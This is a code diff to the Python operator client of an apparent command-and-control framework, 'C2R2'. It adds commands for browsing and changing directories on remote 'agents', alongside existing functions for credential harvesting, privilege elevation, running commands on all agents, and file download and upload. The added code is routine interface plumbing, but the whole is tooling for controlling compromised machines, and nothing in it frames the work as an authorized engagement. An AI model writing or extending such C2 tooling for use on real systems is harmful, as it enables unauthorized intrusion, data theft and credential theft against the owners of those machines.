@@ -518,6 +518,43 @@ class C2R2ApiClient:
         except Exception as e:
             return False, str(e)
     
+    def change_directory(self, agent_id: int, path: str) -> tuple[bool, str]:
+        """Change current directory on agent."""
+        if not self.connected:
+            return False, "Not connected"
+        
+        try:
+            response = requests.post(
+                f"{self.base_url}/api/agents/{agent_id}/cd",
+                headers=self._headers(),
+                json={"path": path},
+                timeout=30
+            )
+            
+            data = response.json()
+            return data.get("success", False), data.get("message", "Unknown error")
+            
+        except Exception as e:
+            return False, str(e)
+    
+    def get_pwd(self, agent_id: int) -> tuple[bool, str]:
+        """Get current working directory of agent."""
+        if not self.connected:
+            return False, "Not connected"
+        
+        try:
+            response = requests.post(
+                f"{self.base_url}/api/agents/{agent_id}/pwd",
+                headers=self._headers(),
+                timeout=30
+            )
+            
+            data = response.json()
+            return data.get("success", False), data.get("message", "Unknown error")
+            
+        except Exception as e:
+            return False, str(e)
+    
     def harvest_credentials(self, agent_id: int) -> tuple[bool, str]:
         """Trigger credential harvesting on agent."""
         if not self.connected:
@@ -1365,14 +1402,22 @@ class C2R2TeamClient:
             output = data.get("output", "")
             is_error = data.get("is_error", False)
             
-            # Check if this is a directory listing response
-            if output.startswith("__DIRLIST__:"):
-                # Parse and display in file explorer if open
-                self._handle_dirlist_output(agent_id, output)
-            else:
-                # Regular command output - log to console
-                tag = 'error' if is_error else None
-                self._log_console(f"📨 [{agent_id}]: {output}\n", tag)
+            # Regular command output - log to console
+            tag = 'error' if is_error else None
+            self._log_console(f"📨 [{agent_id}]: {output}\n", tag)
+        
+        elif event_type == "DirectoryListing":
+            # New directory listing event from server
+            agent_id = data.get("agent_id")
+            path = data.get("path", "")
+            entries = data.get("entries", [])
+            self._handle_directory_listing(agent_id, path, entries)
+        
+        elif event_type == "CwdChanged":
+            # Current working directory changed
+            agent_id = data.get("agent_id")
+            cwd = data.get("cwd", "")
+            self._handle_cwd_changed(agent_id, cwd)
         
         elif event_type == "FileDownloaded":
             self._log_console(
@@ -1403,8 +1448,8 @@ class C2R2TeamClient:
             tag = {'info': 'info', 'warning': 'warning', 'error': 'error'}.get(level, None)
             self._log_console(f"ℹ️ Server: {message}\n", tag)
     
-    def _handle_dirlist_output(self, agent_id: int, output: str):
-        """Parse and display directory listing in file explorer."""
+    def _handle_directory_listing(self, agent_id: int, path: str, entries: list):
+        """Handle directory listing event from server."""
         # Check if file explorer is open for this agent
         if agent_id not in self.file_explorer_data:
             return
@@ -1412,46 +1457,58 @@ class C2R2TeamClient:
         explorer_data = self.file_explorer_data[agent_id]
         tree = explorer_data.get('tree')
         status_var = explorer_data.get('status_var')
+        path_var = explorer_data.get('path_var')
         
         if not tree or not status_var:
             return
         
         try:
-            # Parse __DIRLIST__ output
-            # Format: __DIRLIST__:type|name|size\ntype|name|size\n...
-            content = output.replace("__DIRLIST__:", "").strip()
+            # Update path display
+            if path_var:
+                path_var.set(path)
             
             # Clear existing items
             for item in tree.get_children():
                 tree.delete(item)
             
-            # Parse entries
-            lines = content.split('\n')
-            for line in lines:
-                line = line.strip()
-                if not line:
-                    continue
-                
-                parts = line.split('|')
-                if len(parts) != 3:
-                    continue
-                
-                type_char, name, size_str = parts
-                is_dir = (type_char == 'D')
+            # Parse and display entries
+            for entry in entries:
+                name = entry.get('name', '')
+                is_dir = entry.get('is_dir', False)
+                size = entry.get('size', 0)
                 
                 # Format display
                 file_type = "📁 Folder" if is_dir else "📄 File"
-                size_display = "" if is_dir else f"{int(size_str):,} bytes"
+                size_display = "" if is_dir else f"{size:,} bytes"
                 
-                # Insert into tree
-                tree.insert('', 'end', values=(name, file_type, size_display, ''))
+                # Store is_dir as the last column for navigation logic
+                tree.insert('', 'end', values=(name, file_type, size_display, 'D' if is_dir else 'F'))
             
-            status_var.set(f"Loaded {len(lines)} items")
-            self.logger.info(f"File explorer updated for agent {agent_id}: {len(lines)} items")
+            status_var.set(f"📂 {path} - {len(entries)} items")
+            self.logger.info(f"File explorer updated for agent {agent_id}: {path} ({len(entries)} items)")
             
         except Exception as e:
-            self.logger.error(f"Error parsing dirlist output: {e}")
-            status_var.set(f"Error parsing directory listing")
+            self.logger.error(f"Error handling directory listing: {e}")
+            status_var.set(f"Error loading directory")
+    
+    def _handle_cwd_changed(self, agent_id: int, cwd: str):
+        """Handle current working directory change event."""
+        # Update agent info with new cwd
+        if agent_id in self.agents:
+            self.agents[agent_id]['cwd'] = cwd
+        
+        # Update prompt if this is the selected agent
+        if self.selected_client == agent_id:
+            self._update_prompt()
+        
+        # Update file explorer if open
+        if agent_id in self.file_explorer_data:
+            explorer_data = self.file_explorer_data[agent_id]
+            path_var = explorer_data.get('path_var')
+            if path_var:
+                path_var.set(cwd)
+        
+        self._log_console(f"📁 [{agent_id}] CWD: {cwd}\n", 'info')
     
     def _on_connect_success(self, ssh_host: str, local_port: int, remote_api_port: int):
         """Handle successful connection."""
@@ -1618,7 +1675,18 @@ class C2R2TeamClient:
     def _update_prompt(self):
         """Update the command prompt."""
         if self.selected_client:
-            self.selected_label.config(text=f"C2R2[{self.selected_client}]>")
+            # Show agent ID and CWD if available
+            agent_info = self.agents.get(self.selected_client, {})
+            cwd = agent_info.get('cwd', '')
+            if cwd:
+                # Shorten the path if too long
+                if len(cwd) > 30:
+                    cwd_display = "..." + cwd[-27:]
+                else:
+                    cwd_display = cwd
+                self.selected_label.config(text=f"C2R2[{self.selected_client}:{cwd_display}]>")
+            else:
+                self.selected_label.config(text=f"C2R2[{self.selected_client}]>")
         else:
             self.selected_label.config(text="C2R2>")
     
@@ -1729,6 +1797,27 @@ class C2R2TeamClient:
             else:
                 self._elevate_agent(self.selected_client)
         
+        elif command == '/cd' and len(parts) >= 2:
+            if self.selected_client is None:
+                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
+            else:
+                path = ' '.join(parts[1:])
+                self._change_directory(self.selected_client, path)
+        
+        elif command == '/pwd':
+            if self.selected_client is None:
+                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
+            else:
+                self._get_pwd(self.selected_client)
+        
+        elif command == '/ls':
+            if self.selected_client is None:
+                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
+            else:
+                # List current directory
+                path = ' '.join(parts[1:]) if len(parts) > 1 else ""
+                self._list_directory(self.selected_client, path)
+        
         else:
             self._log_console(f"❌ Unknown command: {command}. Use /help\n", 'error')
     
@@ -1825,6 +1914,33 @@ class C2R2TeamClient:
         
         threading.Thread(target=elevate_thread, daemon=True).start()
     
+    def _change_directory(self, agent_id: int, path: str):
+        """Change current directory on agent."""
+        def cd_thread():
+            success, message = self.api.change_directory(agent_id, path)
+            tag = 'success' if success else 'error'
+            self.root.after(0, lambda: self._log_console(f"📁 [{agent_id}]: {message}\n", tag))
+        
+        threading.Thread(target=cd_thread, daemon=True).start()
+    
+    def _get_pwd(self, agent_id: int):
+        """Get current working directory of agent."""
+        def pwd_thread():
+            success, message = self.api.get_pwd(agent_id)
+            tag = 'success' if success else 'error'
+            self.root.after(0, lambda: self._log_console(f"📁 [{agent_id}]: {message}\n", tag))
+        
+        threading.Thread(target=pwd_thread, daemon=True).start()
+    
+    def _list_directory(self, agent_id: int, path: str):
+        """List directory on agent."""
+        def ls_thread():
+            success, message = self.api.list_directory(agent_id, path)
+            tag = 'success' if success else 'error'
+            self.root.after(0, lambda: self._log_console(f"📂 [{agent_id}]: {message}\n", tag))
+        
+        threading.Thread(target=ls_thread, daemon=True).start()
+    
     def _quick_command(self, cmd: str):
         """Execute a quick action command."""
         self.cmd_entry.delete(0, tk.END)
@@ -1874,7 +1990,10 @@ class C2R2TeamClient:
    /cmd <command>         - Execute command on selected client
    /cmd_all <cmd>         - Execute on ALL clients
 
-📁 File Operations:
+📁 File & Directory Operations:
+   /ls [path]             - List directory (current dir if no path)
+   /cd <path>             - Change current directory
+   /pwd                   - Show current working directory
    /download <path>       - Download file from agent
    /upload <local> <remote> - Upload file to agent
 
@@ -2181,11 +2300,12 @@ class C2R2TeamClient:
             item = selection[0]
             values = file_tree.item(item)['values']
             name = values[0]
-            file_type = values[1]
+            # values[3] contains 'D' for directory or 'F' for file
+            is_directory = (len(values) > 3 and values[3] == 'D') or '📁' in str(values[1])
             
             current_path = path_var.get().rstrip('\\\\//')
             
-            if file_type == 'DIR':
+            if is_directory:
                 # Navigate into directory
                 new_path = f"{current_path}\\{name}"
                 path_var.set(new_path)
@@ -2249,9 +2369,10 @@ class C2R2TeamClient:
             item = selection[0]
             values = file_tree.item(item)['values']
             name = values[0]
-            file_type = values[1]
+            # values[3] contains 'D' for directory or 'F' for file
+            is_directory = (len(values) > 3 and values[3] == 'D') or '📁' in str(values[1])
             
-            if file_type == 'DIR':
+            if is_directory:
                 status_var.set("Cannot download directories")
                 return
             
